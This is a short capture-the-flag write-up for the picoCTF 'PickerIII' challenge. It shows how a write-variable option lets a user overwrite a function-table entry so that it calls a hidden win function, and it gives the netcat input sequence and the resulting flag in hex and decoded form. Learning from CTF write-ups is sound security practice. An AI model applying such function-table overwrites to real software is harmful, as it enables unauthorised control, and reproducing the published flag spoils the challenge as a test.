# PickerIII
## Description
Can you figure out how this program works to get the flag? Connect to the program with netcat: $ nc saturn.picoctf.net 59195 The program's source code can be downloaded here.

### Hints
1. Is there any way to modify the function table?

## Solution
Starting by downloading the source code to check the flow of the diagram here is the [code](picker-III.py);
by reading the code and running it passing the "help" option to list the options;
```
* Enter 'quit' to quit the program.
* Enter 'help' for this text.
* Enter 'reset' to reset the table.
* Enter '1' to execute the first function in the table.
* Enter '2' to execute the second function in the table.
* Enter '3' to execute the third function in the table.
* Enter '4' to execute the fourth function in the table.

Here's the current table:
  
1: print_table
2: read_variable
3: write_variable
4: getRandomNumber
==> 
```
now due to the above program and specially `3: write_variable` I can change a varibale conent, so I can write the name of one I want to change which will be `read_variable`  then passing the name of the function that prints the flag `win` which will be the content of the changed function and the flag will be printed
```
==> 3
Please enter variable name to write: read_variable
Please enter new value of variable: win
==> 2
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 
==> 
```
and got the flag in hex using CyberChef I've decoded the values and got the flag decoded. `picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}`